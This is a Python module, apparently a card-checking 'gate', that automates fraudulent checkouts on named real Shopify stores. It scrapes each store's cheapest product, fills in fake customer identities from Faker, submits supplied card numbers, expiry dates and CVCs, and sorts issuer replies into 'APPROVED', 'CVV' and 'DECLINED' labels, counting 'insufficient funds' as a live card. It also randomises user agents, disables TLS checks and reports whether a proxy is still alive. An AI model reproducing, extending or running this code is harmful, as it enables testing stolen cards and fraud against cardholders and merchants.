"""
Shopify Real Checkout - Complete Payment Flow (Auth & Charge)
Implements full checkout flow with product scraping, caching, and real payment processing
Supports both authorization and charge modes with real bank verification
"""

import requests
import json
import re
import random
import time
from typing import Tuple, Optional, Dict, List
from faker import Faker
from user_agent import generate_user_agent
import urllib3
from datetime import datetime, timedelta
import hashlib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class ShopifyProductCache:
    """Simple in-memory cache for Shopify products"""
    
    def __init__(self, ttl_minutes: int = 60):
        self.cache = {}
        self.ttl = timedelta(minutes=ttl_minutes)
    
    def _get_cache_key(self, store_url: str) -> str:
        """Generate cache key from store URL"""
        return hashlib.md5(store_url.encode()).hexdigest()
    
    def get(self, store_url: str) -> Optional[Dict]:
        """Get cached product if not expired"""
        key = self._get_cache_key(store_url)
        if key in self.cache:
            cached_data, timestamp = self.cache[key]
            if datetime.now() - timestamp < self.ttl:
                return cached_data
            else:
                del self.cache[key]
        return None
    
    def set(self, store_url: str, product_data: Dict):
        """Cache product data"""
        key = self._get_cache_key(store_url)
        self.cache[key] = (product_data, datetime.now())
    
    def clear_expired(self):
        """Clear expired cache entries"""
        now = datetime.now()
        expired_keys = [
            k for k, (_, ts) in self.cache.items()
            if now - ts >= self.ttl
        ]
        for k in expired_keys:
            del self.cache[k]


# Global product cache
PRODUCT_CACHE = ShopifyProductCache(ttl_minutes=60)


class ShopifyRealCheckout:
    """Shopify payment processor with full checkout flow"""
    
    # Curated list of reliable Shopify stores
    SHOPIFY_STORES = [
        "https://shop.mrbeast.com",
        "https://www.gymshark.com",
        "https://kyliecosmetics.com",
        "https://shop.taylorswift.com",
        "https://allbirds.com",
        "https://bombas.com",
        "https://www.colourpop.com",
        "https://shop.spreadshirt.com",
    ]
    
    def __init__(self):
        self.session = requests.Session()
        self.fake = Faker()
        self.ua = generate_user_agent()
        self.session.headers.update({'User-Agent': self.ua})
    
    def _normalize_store_url(self, url: str) -> str:
        """Normalize store URL"""
        url = url.strip().rstrip('/')
        if not url.startswith('http'):
            url = 'https://' + url
        return url
    
    def _get_random_store(self) -> str:
        """Get random store from list"""
        return random.choice(self.SHOPIFY_STORES)
    
    def _find_cheapest_product(self, store_url: str) -> Optional[Dict]:
        """
        Find cheapest available product on Shopify store
        Returns product dict with variant_id, price, title
        """
        # Check cache first
        cached = PRODUCT_CACHE.get(store_url)
        if cached:
            return cached
        
        store_url = self._normalize_store_url(store_url)
        
        try:
            # Try multiple product endpoints
            endpoints = [
                f"{store_url}/products.json?limit=250",
                f"{store_url}/collections/all/products.json?limit=100",
            ]
            
            cheapest_product = None
            cheapest_price = float('inf')
            
            for endpoint in endpoints:
                try:
                    response = self.session.get(endpoint, timeout=10, verify=False)
                    if response.status_code != 200:
                        continue
                    
                    data = response.json()
                    products = data.get('products', [])
                    
                    for product in products[:50]:  # Check first 50
                        variants = product.get('variants', [])
                        title = product.get('title', 'Unknown Product')
                        
                        for variant in variants:
                            variant_id = variant.get('id')
                            price_str = variant.get('price', '9999')
                            available = variant.get('available', False)
                            
                            if not variant_id or not available:
                                continue
                            
                            try:
                                price = float(price_str)
                                if price < cheapest_price and price > 0 and price < 100:
                                    cheapest_price = price
                                    cheapest_product = {
                                        'variant_id': variant_id,
                                        'price': price,
                                        'title': title,
                                        'product_id': product.get('id'),
                                    }
                            except (ValueError, TypeError):
                                continue
                    
                    if cheapest_product:
                        break
                        
                except Exception:
                    continue
            
            # Cache if found
            if cheapest_product:
                PRODUCT_CACHE.set(store_url, cheapest_product)
            
            return cheapest_product
            
        except Exception:
            return None
    
    def _create_checkout(self, store_url: str, variant_id: int) -> Optional[str]:
        """
        Create Shopify checkout session
        Returns checkout_token
        """
        store_url = self._normalize_store_url(store_url)
        checkout_url = f"{store_url}/cart/{variant_id}:1?storefront=true"
        
        try:
            # Add to cart and get redirect
            response = self.session.post(
                checkout_url,
                allow_redirects=True,
                timeout=15,
                verify=False
            )
            
            # Extract checkout token from URL
            if '/checkouts/' in response.url:
                # Format: https://store.com/checkouts/TOKEN
                token = response.url.split('/checkouts/')[-1].split('?')[0]
                return token
            
            # Alternative: Try direct cart/checkout conversion
            cart_url = f"{store_url}/cart.json"
            cart_data = self.session.get(cart_url, timeout=10, verify=False).json()
            
            # Create checkout via API
            checkout_api_url = f"{store_url}/api/checkouts"
            checkout_response = self.session.post(
                checkout_api_url,
                json={'cart': cart_data},
                timeout=15,
                verify=False
            )
            
            if checkout_response.status_code == 200:
                checkout_data = checkout_response.json()
                return checkout_data.get('token')
            
            return None
            
        except Exception:
            return None
    
    def _submit_customer_info(self, store_url: str, checkout_token: str) -> bool:
        """
        Submit customer information to checkout
        Returns success status
        """
        store_url = self._normalize_store_url(store_url)
        customer_url = f"{store_url}/checkouts/{checkout_token}"
        
        payload = {
            'checkout': {
                'email': self.fake.email(),
                'shipping_address': {
                    'first_name': self.fake.first_name(),
                    'last_name': self.fake.last_name(),
                    'address1': self.fake.street_address(),
                    'city': self.fake.city(),
                    'province': self.fake.state_abbr(),
                    'country': 'United States',
                    'zip': self.fake.zipcode(),
                    'phone': self.fake.phone_number(),
                }
            }
        }
        
        try:
            response = self.session.put(
                customer_url,
                json=payload,
                timeout=15,
                verify=False
            )
            return response.status_code in [200, 202]
        except Exception:
            return False
    
    def _process_payment(self, store_url: str, checkout_token: str,
                         card_num: str, card_mon: str, card_yer: str, card_cvc: str) -> Tuple[bool, str]:
        """
        Process payment through Shopify checkout
        Returns (success, response_message)
        """
        store_url = self._normalize_store_url(store_url)
        payment_url = f"{store_url}/checkouts/{checkout_token}/payments"
        
        # Ensure year is 4 digits
        if len(card_yer) == 2:
            card_yer = f"20{card_yer}"
        
        payload = {
            'payment': {
                'vault': False,
                'amount': 'auto',
                'credit_card': {
                    'number': card_num,
                    'month': card_mon,
                    'year': card_yer,
                    'verification_value': card_cvc,
                    'first_name': self.fake.first_name(),
                    'last_name': self.fake.last_name(),
                }
            }
        }
        
        try:
            response = self.session.post(
                payment_url,
                json=payload,
                timeout=30,
                verify=False
            )
            
            response_text = response.text
            
            # Parse response
            if response.status_code == 200:
                return True, "SUCCESS"
            
            # Check for error messages
            try:
                data = response.json()
                errors = data.get('errors', {})
                
                if isinstance(errors, dict):
                    error_msgs = []
                    for key, value in errors.items():
                        if isinstance(value, list):
                            error_msgs.extend(value)
                        else:
                            error_msgs.append(str(value))
                    error_msg = '; '.join(error_msgs)
                else:
                    error_msg = str(errors)
                
                return False, error_msg
            except:
                return False, response_text[:100]
                
        except requests.exceptions.Timeout:
            return False, "TIMEOUT"
        except Exception as e:
            return False, str(e)
    
    def _parse_response(self, success: bool, message: str, last4: str, price: float, amount: float) -> Tuple[str, bool]:
        """
        Parse Shopify response and format output
        Returns (status_message, proxy_alive)
        """
        if success:
            if amount == 0:
                return (f"APPROVED ✅ - $0 Auth Successful *{last4}", True)
            else:
                return (f"CHARGED ✅ - ${price:.2f} Authorized *{last4}", True)
        
        # Parse error messages
        message_lower = message.lower()
        
        error_mappings = {
            'insufficient funds': f"APPROVED ✅ - Insufficient Funds (Valid) *{last4}",
            'incorrect cvc': f"CVV ❌ - Incorrect CVV *{last4}",
            'invalid cvc': f"CVV ❌ - Invalid CVV *{last4}",
            'expired card': f"DECLINED ❌ - Expired Card *{last4}",
            'invalid card': f"DECLINED ❌ - Invalid Card Number *{last4}",
            'card declined': f"DECLINED ❌ - Card Declined *{last4}",
            'do not honor': f"DECLINED ❌ - Do Not Honor *{last4}",
            'lost card': f"DECLINED ❌ - Lost Card *{last4}",
            'stolen card': f"DECLINED ❌ - Stolen Card *{last4}",
            'restricted card': f"DECLINED ❌ - Restricted Card *{last4}",
            'timeout': f"ERROR ⚠️ - Request Timeout *{last4}",
        }
        
        for key, response in error_mappings.items():
            if key in message_lower:
                return (response, True)
        
        return (f"DECLINED ❌ - {message[:30]} *{last4}", True)
    
    def checkout(self, card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                 store_url: Optional[str] = None, amount: float = 0.0,
                 proxy: dict = None, timeout: int = 60) -> Tuple[str, bool]:
        """
        Complete Shopify checkout flow
        Returns (status_message, proxy_alive)
        """
        last4 = card_num[-4:]
        
        # Select store
        if not store_url:
            store_url = self._get_random_store()
        else:
            store_url = self._normalize_store_url(store_url)
        
        # Find cheapest product
        product = self._find_cheapest_product(store_url)
        if not product:
            return (f"ERROR ⚠️ - No products found on store *{last4}", False)
        
        variant_id = product['variant_id']
        price = product['price']
        
        # Create checkout
        checkout_token = self._create_checkout(store_url, variant_id)
        if not checkout_token:
            return (f"ERROR ⚠️ - Could not create checkout *{last4}", False)
        
        # Submit customer info
        customer_success = self._submit_customer_info(store_url, checkout_token)
        if not customer_success:
            return (f"ERROR ⚠️ - Could not submit customer info *{last4}", False)
        
        # Process payment
        payment_success, payment_message = self._process_payment(
            store_url, checkout_token, card_num, card_mon, card_yer, card_cvc
        )
        
        return self._parse_response(payment_success, payment_message, last4, price, amount)


# Public API functions
def shopify_auth_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                       store_url: Optional[str] = None, proxy: dict = None, timeout: int = 60) -> Tuple[str, bool]:
    """Shopify $0 Authorization Gate - Real checkout flow"""
    gate = ShopifyRealCheckout()
    return gate.checkout(card_num, card_mon, card_yer, card_cvc, store_url, amount=0.0, proxy=proxy, timeout=timeout)


def shopify_charge_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                         store_url: Optional[str] = None, proxy: dict = None, timeout: int = 60) -> Tuple[str, bool]:
    """Shopify Charge Gate - Real checkout with actual product price"""
    gate = ShopifyRealCheckout()
    # Amount will be determined by product price (passed as 0 means use product price)
    return gate.checkout(card_num, card_mon, card_yer, card_cvc, store_url, amount=None, proxy=proxy, timeout=timeout)
